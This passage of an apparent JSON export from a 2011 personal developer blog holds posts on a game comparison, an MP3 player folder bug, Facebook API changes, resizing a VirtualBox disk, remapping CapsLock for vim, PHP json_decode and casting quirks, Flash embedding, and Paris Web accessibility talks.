battles, meet people and learn more about what your parents did.</p>\n<p>There is a certain amount of freedom in the way you can explore the world map and go to places where the scenario didn't yet ask you to go. Nothing to compare to RDR of course, but in a game of this time, you appreciate it. There are no invisible walls telling you \"You can't go there\", only signs suggesting that \"This area is for the more experienced\".</p>\n<p>I only have played a couple hours so far, but I like the way the story is told. People that have known your parents told you what they did, who they were, where they've been, etc. The story is still following the rails of the scripted scenario but does so in an elegant way.</p>\n<p><em>Note : The previous JRPG I played, Final Fantasy, was waaaaay more strict on its storyline order, so my appreciation of Tales of Phantasia might be biased due to the comparison.</em></p>\n<h4>Graphics</h4>\n<p>RDR takes advantage of the PS3 power. All characters are animated using motion capture and voiced dialogs, making the world seem real. Animation are still a bit sluggish at time, and always done directly in the game engine. It keeps consistency, but the engine seems a bit dated.</p>\n<p>I usually am a PC player, I've played Bioshock and Crisis when they came out in maximum quality, so I'm not easily impressed by graphics rendering. The only game on the PS3 that impressed my was Uncharted 2 and RDR is absolutly not up to that standard. RDR is like most of the games I've played on PS3. It has \"honest\" graphics : not ugly, but nothing breathtaking either.</p>\n<p>LOD handling is pretty bad in my opinion. When riding your horse in the desert, grass and bushes flashes in view from simple LOD to fully detailed in a split second. It defeat the whole purpose of LOD in my opinion, which should be done using a smooth transition between the two.</p>\n<p>Also, during cutscenes, when the camera change angle (moving from a close shot to John, to a shot to the person he's talking to for example), the LOD kept flashing. Everytime the camera change, you see the building in the background displayed as big blocks of colors then fully detailed, and on the next camera change you got them again from big block to details, even if they are the same building in the two shots. All that goes very fast, but I kept noticing it. Worse, sometimes buildings are exactly on the limit between rough and detailed so they kept flashing from one to another.</p>\n<p>Overall, I'm not satisfied with RDR graphics. They definitly are not ugly but are just above average and this is not RDR strong point.</p>\n<p>One can wonder how I can even compare a full 3D game with an old 16bit RPG. I am not comparing the two, I'm comparing each one to what the standard are for the machine they are running.</p>\n<p>Tales of Phantasia is the more detailed RPG I've ever played on a 16bit console. The attention to detail is amazing. Each house, each city is fully detailed. There are fires burning in the chimneys, flowers on the tables, painting and cracks on the walls, carpets on the floor, etc. No two houses are the same, and the furnitures placed in each are done so in a logical way : the exact number of beds for the people living in a house, no house without kitchen, etc.</p>\n<p>For a 16bit game, I must say I'm impressed. There are details everywhere, from hanging ropes in boats to patch of flowers and rocks on roads, it is really refreshing. When visiting a boat, the screen moves to emulate the rolling of the waves. This is no big deal but this is kind of details I appreciate.</p>\n<h4>Shopping UI</h4>\n<p>One thing that strike me as odd is how hard it is to sell goods in RDR. When speaking to a merchant, you can select goods you wish to sell and press X to sell them. If you have multiple goods of the same kind, you can select a few or all at once. The strange thing is that you can't select different goods at once, you have to do it one by one (and you usually have a lot of different goods coming from skinning various animals).</p>\n<p>Worst, goods you sell do not disappear from the list, they are just marked as \"Sold\", you have to manually select the next in the list to proceed. And as the list is more like a grid, you can't simply press down to sell the next item, you have to select it in the list. To make it even a little more frustrating to use, everytime you sell an item, a little animation is played, freezing your UI for a second.</p>\n<p>Such an UI would never have passed quality insurance tests if the game had been developped for a PC audience. I do not understand why crappy UI is considered normal for console players.</p>\n<p>The shopping UI of Tales of Phantasia has nothing awesome but is just well thought. Presented with a list of goods to buy you can select the desired quantity of each, see the total amount and make adjustement regarding your current cash level. You also see the current number of each item you already own. As I said, nothing extraordinary, just really well thought and very practical.</p>\n<p>Screen resolution and hardware power has absolutly no influence on the greatness of UI here.</p>\n<h4>Music</h4>\n<p>RDR music is honest, there isn't any theme that get stuck in your mind after playing, but the various ambiances are pleasant and strike our common imaginary background of the far west.</p>\n<p>Tales of Phantasia music is also classical JRPG music, with some great songs, but the important point here is that they managed to make wonder with the small audio capabilities of the original console. Some music at some important points in the story have digitalized voices. Yeah, really. This is not crystal clear voices as a CD would allow today, but it is clear enough so you can recognize the melody and words (well, if you understand Japanese...).</p>\n<p>Also, even if each city has its own theme, you sometimes encounter NPC in those cities with their own themes, and the two musics blends into one other when you approach the NPC. It is something common in today games, but the first time I see it in a 16bit game.</p>\n<h4>Frustration</h4>\n<p>I have been very frustrated playing RDR. A lot of little things that add up and degrade my playing experience. Here are some random rambling :</p>\n<p>I've failed a large number of missions because I strampled over pedestrian while galloping with my horse. In one mission, I was asked to save three horses from a barn on fire. I saved the first two by slapping them on the back so they can go out of the barn. For the last one, I had ride it and jump over the fire to get out. I did just that and jumped out of the barn and got a \"Mission failed\" screen. Wait, what ?</p>\n<p>It appeared that I assaulted one of the farmers that was trying to help. This dumbass was standing right in the spot where the mission asked me to jump, so when jumping over the fire I ran into him and the game considered it an assault, failed the mission and made me try it again.</p>\n<p>This isn't the only grudge I have with horse. There are a couple of weird stuff occuring with the way horses are handled in the game. During a mission, one of the NPC rode my horse instead of his own, so when I whistle my horse back, another one came instead. As fast as my horse, but with a totally different color.</p>\n<p>I once whistle for my horse that came galopping to me, running right past me and went splashing in the river, dying instantly...</p>\n<p>Speaking of rivers, this is something really frustrating. Your character can't swim, actually as soon as he got water above the waist, he drowns. Even on horseback : water rise to your horse collar and your waist, and you drown. That is both stupid and frustrating, dying for something that you absolutly can't imagine the first time it occurs to you.</p>\n<h4>Funny story</h4>\n<p>On an other occasion, I saw two guys shooting a third one trying to escape. I thought they were bandits trying to kill an innocent traveller, so I shot them. Bad choice, they were deputies trying to kill a bandit... I lost some honor in the process and the bandit turn back on me, trying to kill me after I saved him.</p>\n<p>A few hours later, same scenario. Two guys trying to kill a lone one. Based on my previous experience I decided to kill the escaping bandit. I lost honor too. It appeared it really were two bandits trying to kill a traveller this time... Of course the two bandits didn't thank me and started shooting me. So I had to kill them too.</p>\n<p>Third time, same scenario, two guys shooting a third fleeing one. This time I decided to wait a little and hear what they had to say, to better understand who they were and take side with the good guys this time. I didn't have time to think too much, because a few seconds later the third guy was dead, killed by the other two. And I lost honor too. Grrrr. They were bandits and I let them kill him an innocent man.</p>\n<p>Last but not least I encountered those three guys one last time. This time I saw that it was two deputies, asking me to help them capture the escaping bandit. Ok, this time it was clear. I decided to catch the bandit with my lasso (getting bounties alive gets you paid double). I catched him, but while I was tying him up, the deputies started shooting me. Actually, they were shooting the bandit but I was standing between him and them so I took a couple bullets. Once tied up and lying on the ground, the deputies continued shooting him until he died... Goodbye reward...</p>\n<p>And this is only one in the multiple stories I could tell about those random encounters plaggued with less-than-average AI. It resulted in a lot of frustration and some wtf moments.</p>\n<h4>Conclusion</h4>\n<p>First of all, thank you to have read this pamphlet from start to end, as it mostly was random rambling that I needed to get out. As a last word I might say that I'm impressed by the way Tales of Phantasia managed to push the boundaries of the hardware, and managed to immerse you in its atmosphere through multiple little details both in controls, music, graphics and story</p>\n<p>On the other hand, Red Dead Redemption is a game just above average. My general gaming feeling was spoiled by a all those little overlooked details and glitches that in the end kept frustrating me.</p>\n<p>In the end, both games are interesting in term of Game Design because you can learn a lot from them. From Red Dead Redemption I've learned a lot of small details that must not be overlooked in term of UI and gaming experience to not frustrate the player. From Tales of Phantasia I've learned that all those little details that you take care of add up and your players will thank you for it.</p>",
  "publish_start": "2011-09-17 13:14:50",
  "slug": "red-dead-redemption-tales-phantasia"
}, {
  "id": 314,
  "name": "Sansa Clip+ folder merging issue",
  "text": "<p>I own a <a title=\"Sansa Clip+ review on abi\" href=\"http://anythingbutipod.com/2009/08/sandisk-sansa-clip-plus-review/\" target=\"_blank\">Sansa Clip+</a> as my mp3 player. It's really small, has great audio quality and combined with a 32Go microSD card plus the internal 8Go, it's enough to hold almost all my music library.</p>\n<p>As with any mp3 player realeased nowadays, you can browse your files using mp3 tags. I don't really like it and feel limited in my browsing. As I'm listening to a lot of movie soundtracks I have a pretty long list of artists with only one song attached.</p>\n<p>Fortunatly, the Sansa also allows you to browse by folders, which is rare enough to be highlighted.</p>\n<p>So far so good. Except that I've discovered a little bug a few days ago in the way folder navigation is done.</p>\n<p>I had two folders named <code>Soundtrack - Games</code> and <code>Soundtrack - Movies</code>. Each were holding a dozen albums. In each of those folders I had subfolders sharing the same prefix, like <code>Hitman Contracts</code>, <code>Hitman Blood Money</code> or <code>Kill Bill</code> and <code>Kill Bill volume 2</code>.</p>\n<p>When browsing my music folder on the Sansa I noticed that the <code>Soundtrack - Games</code> folder had disappeared. I check the SD card in my computer, and it really was there.</p>\n<p>I finally discovered that all the <code>Sountracks - Games</code> content had been merged in <code>Soundtracks - Movies</code> resulting in one big directory instead of two smaller ones.</p>\n<p>My second discovery was that all my <code>Hitman</code> sub folders were also merged into <code>Hitman Contracts</code>, and my <code>Kill Bill</code> music was in <code>Kill Bill volume 2</code>.</p>\n<p>It seems that when multiple directories shared the same prefix, all folders will be merged in one whose name is the last in alphabetical order.</p>\n<p>I'm not the only one in this case, I saw a similar report on Sandisk forums, but the bug seems erratic. Folders does not always get merged if sharing a prefix.</p>\n<p>As a temporary fix, waiting for a regular fix in a firmware update, I'll update my folder tree to use <code>Soundtracks/Games/Hitman/Contracts</code> and <code>Soundtracks/Movies/Kill Bill/Volume 1</code> but this is far from optimal.</p>",
  "publish_start": "2011-09-22 11:16:25",
  "slug": "sansa-clip-folder-merging-issue"
}, {
  "id": 316,
  "name": "Checking potential throttling from Orange",
  "text": "<p>Starting a few weeks back, we started having painfully slow ssh connections at work. Our servers are hosted on the <a href=\"http://www.softlayer.com/\">SoftLayer </a>infrastructure, which are extended on all North American territory, but we are based in France.</p>\n<p>We have fiber-optic connection here, almost every other connection is blazingly fast. Except connections to our own servers...</p>\n<p>Call me paranoid, but the first idea we got was that we were being throttled by our provider. Orange is infamously known for degrading on purpose connection with some know hosts.</p>\n<p>A colleague was browsing through his own secure tunnel, going through his personnal server for every outgoing communication.</p>\n<p>And his connection was as fast as it should be.</p>\n<p>That made us wonder. How a tunneled connection could be faster than a normal one ? The cost of crypting data should have slow the request down. It had the opposite effect, rendering the request in the expected time.</p>\n<p>I created a garbage file using the following code and used <code>scp</code> to send it from one server to another, to test bandwith.</p>\n<pre><code lang=\"sh\">dd if=/dev/zero of=garbage.bin bs=100000000 count=1</code></pre>\n<p>Nothing interesting came out of it. I had a impressivly fast connection between our fiber connection and OVH (up to 50Mb/s) and slow connection to SoftLayer.</p>\n<p>So, for the time being, I'm connecting to SoftLayer through OVH and even if it made me use one more tunnel, it is still far more fast than a direct connection.</p>",
  "publish_start": "2011-10-03 12:39:01",
  "slug": "checking-potential-throttling-orange"
}, {
  "id": 320,
  "name": "Accessing a frame with Firebug console",
  "text": "<p>If you want to access the Javascript console of an inner frame of a webpage, know that you can \"browse\" through the window as you could browse through a file system.</p>\n<p>For example, if you want Firebug to use the first frameof the page as its current window object, just type the following code in Firebug console :</p>\n<pre><code lang=\"js\">cd(window.frames[0])</code></pre>\n<p>This proved immensely useful when debugging a Facebook application.</p>",
  "publish_start": "2011-10-11 11:55:54",
  "slug": "accessing-frame-firebug-console"
}, {
  "id": 318,
  "name": "Getting the list of Facebook pending requests of a user",
  "text": "<p>Getting the list of pending facebook requests of a user a few weeks back was as easy as calling</p>\n<pre><code lang=\"ini\">https://graph.facebook.com/me/apprequests?access_token={user_access_token}</code></pre>\n<p>We discovered around the 1st October that some of our requests were failing in production, without any more clue than some \"OAuthException : access_token invalid\" messages in our logs.</p>\n<p>It appears that FB changed the way their endpoint react to <code>/apprequests</code> call. Of course, they didn't bother telling us.</p>\n<p>The previous url does not work anymore. Switching the user access_token to the app access_token as documented does not work (as usual with FB documentation). It returns an error.</p>\n<p>Instead, the following call wil yield the correct result :</p>\n<pre><code lang=\"ini\">https://graph.facebook.com/{user_id}/apprequests?access_token={app_access_token}</code></pre>",
  "publish_start": "2011-10-07 16:23:16",
  "slug": "list-facebook-pending-requests-user"
}, {
  "id": 317,
  "name": "Increasing VirtualBox hard drive size",
  "text": "<p>While trying to import a huge (1.7Go) mysql dump file into my VM I was blocked by mysql telling me that not enough space was left on the device to complete the operation.</p>\n<p>As I was running a VM, I thought it would be a simple matter of increasing the virtual hard drive size.</p>\n<p>Turns out it wasn't that simple. After much trial and error, here is how I finally did it.</p>\n<h4>Creating a new hard drive</h4>\n<p>VirtualBox let you easily add new devices, such as hard drives to your VM. I simply created an empty 120Go hard drive and booted my VM.</p>\n<p>Here, under Ubuntu, I cloned my current hard drive to the new one using :</p>\n<pre><code lang=\"sh\">sudo dd if=/dev/sda of=/dev/sdb</code></pre>\n<h4>Fixing the guest partition</h4>\n<p>Once finished, I opened Gparted, selected <code>/dev/sdb</code> and saw that I had 112Go unallocated. I couldn't easily add them to the initial partition as a swap partition was in the way.</p>\n<p>I finally decided to remove the swap partition and resize the initial one to the (almost) complete size of the hard drive.</p>\n<p>I left 1Go free in case I ever needed to create a new swap partition later to fix the one I deleted.</p>\n<p>Then, I closed the VM. Get back to VirtualBox panel and remove the original drive, keeping only the new 120Go one.</p>\n<p>One reboot later, my Ubuntu was proudly displaying its 120Go.</p>",
  "publish_start": "2011-10-04 11:28:25",
  "slug": "increasing-virtualbox-hard-drive-size"
}, {
  "id": 319,
  "name": "Toggling insert/normal mode in vim with CapsLock",
  "text": "<p>You know that CapsLock key on your keyboard ? The sole usage of this key is to SHOUT ON TEH INTERNETS§§§. I decided to disable it completly as I never use it on purpose.</p>\n<p>I also wanted to use it in vim to toggle between normal and insert mode with one key instead of the default <code>i</code>/<code>Esc</code>.</p>\n<h4>Disabling CapsLock</h4>\n<p>Disabling CapsLock is a fairly straightforward process. The xmodmap program is responsible for binding keyboard events to your software and you can change the default behavior by creating an <code>~/.Xmodmap</code> file.</p>\n<p>Just put the following code in it and the pressing the CapsLock key will no longer block your next keys in Caps.</p>\n<pre><code lang=\"ini\">clear Lock</code></pre>\n<h4>Catching it in vim</h4>\n<p>Now, to get it in vim, you'll have a little more work to do. First, CapsLock is not one of the default vim keycodes, so you won't be able to remap it to any useful function. To use it in vim, we will hook it directly on xmodmap to another key, one that is part of vim default keycodes.</p>\n<p>I choose the virtual F13 key. Your physical keyboard might only have F keys from 1 to 12, but the internal software seems to be able to react to 37 of them. So, why not using them ?</p>\n<p>In your <code>~/.Xmodmap</code> file, this is as easy as adding the following line</p>\n<pre><code lang=\"ini\">keycode 66 = F13</code></pre>\n<p>66 is the internal code for the CapsLock key. We just define that pressing the physical CapsLock key should trigger the F13 virtual key.</p>\n<p>Now, in <code>~/.vimrc</code>, we will tell vim to explictly listen to extended F keys (from 13 to 37) which it does not do by default.</p>\n<pre><code lang=\"ini\">set &lt;F13&gt;=^[[25~</code></pre>\n<p><code>^[[25~</code> is the special keyboard code sent to vim when the F13 key is triggered. Here we just define that such a keyboard code should be interpreted in vim as an <code>&lt;F13&gt;</code> vim key.</p>\n<p>Now, you can use <code>&lt;F13&gt;</code> in your custom vim mappings</p>\n<h4>Toggling normal/insert mode in vim</h4>\n<p>vim accepts two kinds of mapping. Those triggered in normal mode (using <code>nnoremap</code>) and those triggered in insert mode (using <code>inoremap</code>).</p>\n<p>Here we want that pressing CapsLock (or <code>&lt;F13&gt;</code> in vim as we defined) in normal mode will go to insert mode, like pressing <code>i</code> does. And we also want to get back to normal mode when pressing CapsLock in insert mode, just like pressing <code>Esc</code> does.</p>\n<pre><code lang=\"ini\">nnoremap &lt;F13&gt; i<br />inoremap &lt;F13&gt; &lt;Esc&gt;l</code></pre>\n<p>Notice the <code>l</code> after Esc. It is here to prevent the caret to move back one character when exiting insert mode.</p>\n<h4>Fixing the shell</h4>\n<p>One last thing to fix is your shell. By defining in xmodmap that pressing CapsLock would trigger an F13 event, it means that whatever software that react on F13 will now react on CapsLock. Unfortunatly, zsh does react on F13. It insert a <code>~</code> character on it (just like it does with F12).</p>\n<p>To disable it, we'll simply define a key binding in <code>~/.zshrc</code> so pressing F13 does nothing.</p>\n<pre><code lang=\"ini\">bindkey -s \"\\e[25~\" \"\"</code></pre>\n<p>Here it is. You can now press CapsLock anywhere and it won't have any effect. Plus, pressing it in vim will toggle insert/normal mode.</p>",
  "publish_start": "2011-10-09 14:43:35",
  "slug": "toggling-insert-normal-mode-vim-capslock"
}, {
  "id": 321,
  "name": "Fix the floating issue with json_decode in PHP 5.3",
  "text": "<p>When dealing with online API that are handling a lot of items (like Twitter or Facebook), you'd better be aware of a PHP limitation with <code>json_decode</code>.</p>\n<p><code>json_decode</code> is supposed to take a JSON string and return a PHP array or a PHP object from it.</p>\n<p>Unfortunatly if one of the key is an int and is bigger than the max int value, it will be cast as float instead. And you'll lose precision in the process.</p>\n<p>In my case it resulted in a complete unability to find a user in the database as the id didn't match anything. This was quite hard to find as I couldn't reproduce it on my local machine.</p>\n<h4>Know your system</h4>\n<p>My local system was a 64bits machine while the production servers were 32bits. And of course, max int precision is far bigger on 64bits machines so the error didn't pop in my tests.</p>\n<p>If you're running PHP 5.4, the fix is easy. Just add the <code>JSON_BIGINT_AS_STRING</code> bitmask as 4th option like this</p>\n<pre><code lang=\"php\">$decoded = json_decode($encoded, true, null, JSON_BIGINT_AS_STRING);</code></pre>\n<p>If you're running a 32bits machine with PHP 5.3 like me, it's a little more tricky.</p>\n<h4>The regexp</h4>\n<p>My solution is to parse the original JSON string and add quotes around ints so <code>json_decode</code> will keep them as string.</p>\n<p>My first attempt was naive</p>\n<pre><code lang=\"php\">preg_replace('/\":([0-9]+),/', '\":$1,', $encoded)</code></pre>\n<p>This will find any int between <code>\":</code> (marking the end of a key) and <code>,</code> (marking the start of the next key), and replace it with the same string but enclosed in quotes.</p>\n<p>I soon found out that this did not cover all the cases, especially if the int key was the last of the JSON, it won't be followed by a <code>,</code> but by a <code>}</code> instead.</p>\n<p>So, I adapted it a little bit :</p>\n<pre><code lang=\"php\">preg_replace('/\":([0-9]+)(,|})/', '\":\"$1\"$2', $encoded)</code></pre>\n<p>Ok, it worked better. Any int key in the JSON, anywhere will be enclosed in quotes.</p>\n<p>It was a little overkill so I decided to limit it to keys of at least 10 digits</p>\n<pre><code lang=\"php\">preg_replace('/\":([0-9]{10,})(,|})/', '\":\"$1\"$2', $encoded)</code></pre>\n<p>Better. But still not perfect.</p>\n<p>As I soon discovered, sometimes Facebook returned JSON containing JSON itself (in Request <code>data </code>or Credit <code>order_info</code> for example).</p>\n<p>The previous approach would add quotes around ints in JSON escaped string and would thus corrupt the whole key.</p>\n<p>This time, I added a final touch. I only added quotes around int that were not in an escaped JSON string themselves, by checking that the closing quote of the key wasn't escaped.</p>\n<pre><code lang=\"php\">preg_replace('/([^\\\\\\])\":([0-9]{10,})(,|})/', '$1\":\"$2\"$3', $encoded)</code></pre>\n<p>Here it is, the final fix. I might have forgotten some corner cases, but at least it works for my current application.</p>\n<p>Hope it helps !</p>\n<br />",
  "publish_start": "2011-10-12 20:38:54",
  "slug": "fix-floating-issue-json-decode-php-5-3"
}, {
  "id": 322,
  "name": " swfobject.getObjectById() when flash not installed",
  "text": "<p>SWFObject is the de-facto library used whenever you need to ember Flash files in your code. It takes care of smoothing all cross browser issues.</p>\n<p>It has a <code>getFlashPlayerVersion </code>method that return a string of the current version in the form <code>major.minor.release</code>. Its value is <code>0.0.0</code> if Flash isn't installed.</p>\n<p>It also provides a cross browser markup, including conditionnal comments for IE, that validate and works everywhere. The downside is that it forces you to create two elements in your markup with the same id.</p>\n<p>Hopefully, the <code>getObjectById </code>method is here to return the correct DOM element based on the browser flash integration type.</p>\n<p>But... It seems that the mechanisme is buggy when Flash isn't installed (on 2.2)</p>\n<p>I've tested running IE9 without Flash installed and FF8 with Flash disabled, and the return of <code>getObjectById </code>differs : I got <code>null </code>in IE9 and the DOM element in FF8.</p>\n<p>I've added a small patch to my code to take it into account :</p>\n<pre><code lang=\"js\">var el = swfobject.getObjectById(id) || document.getElementById(id);</code></pre>\n<p>And I've also submitted a <a href=\"http://code.google.com/p/swfobject/issues/detail?id=599&amp;thanks=599&amp;ts=1319792868\">bug report</a>.</p>",
  "publish_start": "2011-10-28 11:08:16",
  "slug": "swfobject-getobjectbyid-flash-installed"
}, {
  "id": 323,
  "name": "Passing flashVars with Flash 10 in IE",
  "text": "<p>I've spent the last two days debugging a weird issue involving https, IE and Flash.</p>\n<p>In the end, I boiled the issue down to IE and Flash 10, https wasn't involved (in fact, that was a different issue).</p>\n<h4>Markup hell</h4>\n<p>It is known that to have a real crossbrowser markup to embed Flash we need an IE specific version and a non-IE one.</p>\n<p>What I didn't know was that <code>flashvars </code>needed to be passed in two different formats between Flash player 10 and Flash player 11.</p>\n<p>11 expect the classic <code>flashvars </code>parameter while 10 expect them to be passed as simili GET parameters to the movie url.</p>\n<h4>Final HTML markup</h4>\n<p>In the end, here is the PHP code I use to generate my SWF markup :</p>\n<pre><code lang=\"php\">sprintf(<br />\t'&lt;object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"%1$s\" height=\"%2$s\" id=\"%3$s\"&gt;<br />\t\t&lt;param name=\"movie\" value=\"%4$s?%6$s\" /&gt;<br />\t\t%5$s<br />\t\t&lt;!--[if !IE]&gt;--&gt;<br />\t\t\t&lt;object type=\"application/x-shockwave-flash\" data=\"%4$s\" width=\"%1$s\" height=\"%2$s\"&gt;<br />\t\t\t%5$s<br />\t\t&lt;!--&lt;![endif]--&gt;<br />\t\t%7$s<br />\t\t&lt;!--[if !IE]&gt;--&gt;&lt;/object&gt;&lt;!--&lt;![endif]--&gt;<br />\t&lt;/object&gt;<br />',<br />$width, $height, $id, $url, $params, $flashVars, $alternateContent);</code></pre>\n<p>Where :</p>\n<ul>\n<li><code>$width</code> and <code>$height</code> are the size (in pixel) of your movie</li>\n<li><code>$id</code> is the html/css id of the main object element (as used in <code>swfObject.getObjectById</code>)</li>\n<li><code>$url</code> is the url address of your swf file</li>\n<li><code>$params</code> is a string containing all the <code>&lt;param name=\"name\" value=\"value\" /&gt;</code> that you want to pass. Usually it will contain the <code>wmode</code>, <code>allowfullscreen</code>, <code>allowscriptaccess </code>and <code>flashvars </code>keys.</li>\n<li><code>$flashVars</code> is a duplicate of the <code>flashVars </code>key of <code>$params</code> and should contain a string in the form <code>foo=bar&amp;baz=nyan</code> to be passed to the swf in Flash 10</li>\n<li><code>$alternateContent</code> is the html text to be displayed when Flash is not installed in the browse</li>\n</ul>\n<p>I hope that this markup will help you, because I spent a damn long time testing all that stuff, jungling between VM and IE instances.</p>",
  "publish_start": "2011-10-31 16:34:04",
  "slug": "passing-flashvars-flash-10"
}, {
  "id": 324,
  "name": "Getting list of Facebook friends from a test account",
  "text": "<p>To get the list of friends of a specific user, you are supposed to issue a simple <code>GET </code>request to <code>me/friends</code> (or <code>USER_ID/friends</code>), passing the user accessToken in the request.</p>\n<p>Facebook used to return an array named <code>data</code> where each value is an object representing a friend. Each of this objects had two keys : <code>id </code>and <code>name</code>.</p>\n<p>Until yesterday, it worked well.</p>\n<p>Today, it seems broken for test users. The <code>name </code>key is no longer returned in the call, you only get <code>id</code>.</p>\n<p>I'm not sure it's intentionnal or not. At least I haven't seen any notice about this change. But I'm not sure it's a bug either, as Facebook documentation is crappy, we never really know if the output we got is the expected one or if it's a bug.</p>\n<p>I'm not even sure we were supposed to get the <code>name </code>in the first place, actually.</p>\n<p>What is definitely a bug is that the behavior is different for test users that for classic users.</p>",
  "publish_start": "2011-11-23 14:51:52",
  "slug": "list-facebook-friends-test-account"
}, {
  "id": 325,
  "name": "Web and dev events in Paris",
  "text": "<p>For the past month or so, I've attended quite a bunch of dev and web events, here in Paris.</p>\n<p>Every time I get back from one, I wanted to post something about it. But I never did, as I always seems to have something more important to do. That's quite a shame, because those events were (for the most part) really interesting, some were even really motivating.</p>\n<p>So, expect a full blog post on each of them in the coming days. For the time being, here is just an overview.</p>\n<p><span style=\"background-color: rgba(127, 127, 127, 0.0898438);\"><a href=\"http://www.paris-web.fr/\">Paris Web</a> is THE french web event. Two days of conferences about the web, not too technical, but very practical. Here we speak equally about the \"why\" than about the \"how\". Very great speakers, team and place. The third day is for workshops, in smaller groups.</span></p>\n<p><span style=\"background-color: rgba(127, 127, 127, 0.0898438);\">Then comes <a href=\"http://parisjs.org/\">Paris JS</a>, held each month. It's an evening of informal talks about Javascript, a few speakers will demo an app, a framework, or talk about anything JS related. Very great to meet interesting JS fellows, and exchange about frameworks and projects.</span></p>\n<p><a href=\"http://parishackers.org/\">Paris Hacker</a> is an other informal event, where everyone is free to speak about any hacky/geeky subject. Most of the time we review the last Hacker news posts and discuss them, talk about incoming events, and so on. There almost no trolling. Most of the time.</p>\n<p><a href=\"http://js-attitude.fr/js-guru/\">JsGuru</a> is a completly different kind of event. This one is a one-day Javascript formation. It costs real money this time, but you got to learn a few tricks and get your started on some frameworks and libraries like Backbone, Mustache, Lawnchair, etc.</p>\n<p>And the final one is the <a href=\"http://hackdayparis.org/\">Hack Day Paris</a>. Partially organized by the same team as Paris Hacker, it was a 40hrs hackathon, with no constraint except to \"build something brilliant\". More than 180 fellow geeks attended, and 43 projects were finally demoed on stage. This was one of the most motivating experience I ever did.</p>\n<p>A few days after the Hack Day, an other event was held by SFR were all the Hack Day participants were invited. Along with participant from two other events (Designer Weekend and Museomix), the goal was to help all those people to meet, and to showcase some of SFR latest innovation. This is clearly the event that I liked less.</p>",
  "publish_start": "2011-11-24 18:30:44",
  "slug": "web-dev-events-paris"
}, {
  "id": 326,
  "name": "Paris Web 2011 : Accessibility",
  "text": "<p>In October, I was attending the Paris Web event. For those that haven't heard of it, it is THE french web event, two days of conference on various subjects web related. It is language agnostic and talks range a very broad list of topics from accessibility, open data, security, performance, UX, UI, html5, etc.</p>\n<p>I've attended 16 talks in the course of the event, plus a full day of workshops. I would need far more than a single post to write down everything I learn from those days, both technical and human. I really love Paris Web for those moments where you start to chat with other peoples as passionate as you are.</p>\n<p>Here, I'll only focus on a specific subject that everyone cared about : Accessibility.</p>\n<h4>Know your audience</h4>\n<p>Accessibility was discussed at length, as it always is the case in Paris Web. It is one of the values held by Paris Web that I also hold dear. My only regret is that it feels like everyone in Paris Web attendee were already familiar with it, had implemented at least the basic good practices, that we all were already convinced of why it is good. I kind of feel that were not the right public, that the speech was wasted on us as we already were convinced.</p>\n<p>We, as web professional, are aware of the accessibility concerns. Big groups and public websites are aware of it too. But the middle ground of small companies do not care. \"This is not our target\", \"Spending 40% more for 10% of users ? No way\", \"We are not big enough\", are answers I've often heard when trying to explain to clients why I cared about aspects of their projects they didn't even see.</p>\n<h4>Continuous integration</h4>\n<p>Laurent Denis and Elie Sloïm told us that accessibility should not be thought as the last part of a project, the one we do the day before launch. It has to be taken into account for the very start of the project, in the conception phase, and not at the end, as a correction phase.</p>\n<p>Every person ever included in the project should be at least aware of the accessibility concern, this is not the work of one man alone. Accessibility experts are not people you can hire to fix your website once it's done. They should be requestd during all the conception phase.</p>\n<p>No one ever read the 100 page accessibility audit. No one wants to be told at the end of the project that what they did is wrong and that they should start everything over from scratch. Instead, mini briefs, on mini subjects, sometimes no longer than 15mn, on a regular basis can yield very great results. Starting with the general website semantic, adding unobstrusive javascript, and going deeper and deeper into tasks more and more difficult.</p>\n<p>There is no perfection in accessibility. There's only an ideal we tend to. You don't fix a website for accessibility, you just improve it.</p>\n<h4>Throw away formal accreditations</h4>\n<p>We can't make a website absolutly perfect, we can just improve it on little touches to make it better and better. A, AA and AAA homologation is absurd, because there is no metrics to quantify the level of accessibility of a website. How could you compare two accessibility features ? How video subtitles is more accessible than alt on images ? We should just forget the accreditations. At first, we did accessibility improvement to help people with disabilities. Somewhere along the years, we became legally forced to provide accessibility measures and it became one more line on the planning and we lost the initial meaning that was driving us.</p>\n<p>We should really take accessibility down that pedestal we put it. It's not that hard to make an accessible website, don't be scared by the list of accreditation and rules.</p>\n<h4>What about HTML5 ?</h4>\n<p>The geek side of your mind can't stop feeling the excitation when everyone talks about all the shiny stuff : file API, history, geolocation, web sockets, forms, etc. But the eternal question remains : what good are those new toys if we can only serve them to a handful of users.  Will I use them now, for the benefit of only some, or will I wait for better support for the benefit of all ?  But if I don't promote them myself, I'm only slowing down adoption by all browsers...</p>\n<p>That's a tricky question and I don't have a definite answer (and that's fine !).</p>\n<p>Paul Bakaus posted recently and article where he stated that it is better to build something awesome for 70% of the people that something good for 95% of them.  It surely is true in the gaming world where gamers have the habit of buying new hardware to keep with the new game graphics. In the classical web world, we are still scared of asking the user to change its browser.</p>\n<p>But it tickles my accessibility sense when someone told me that a part of the users won't be able to access the content because they don't have the correct requirement. This feels absolutly contrary to the open web principles.</p>\n<h4></h4>",
  "publish_start": "2011-11-24 19:35:06",
  "slug": "paris-web-2011-accessibility"
}, {
  "id": 327,
  "name": "Weird PHP behavior when casting as an object",
  "text": "<p>I've just stumbled upon that weird behavior when force casting the return of a function to an object. The PHP result was not what I expected.</p>\n<pre><code lang=\"php\">$a = null;<br />echo empty($a) ? \"Yes, I'm empty\" : \"You should not see this\"</code></pre>\n<p>This is pretty straighforward code. Now, we test it with an object.</p>\n<pre><code lang=\"php\">$a = (object) null;<br />echo empty($a) ? \"Yes, I'm empty\" : \"You should not see this but, actually, you do.\"</code></pre>\n<p>Note that it even gets weirder when <code>(object) false</code> and <code>(object) true</code> become objects with a key <code>scalar</code>, set to <code>false</code></p>\n<p>This is one of the little things that make me want to ditch PHP for a better language.</p>",
  "publish_start": "2011-11-28 17:10:34",
  "slug": "weird-php-behavior-casting-object"
}, {
  "id": 328,
  "name": "PHP AND / OR differences with && / ||",
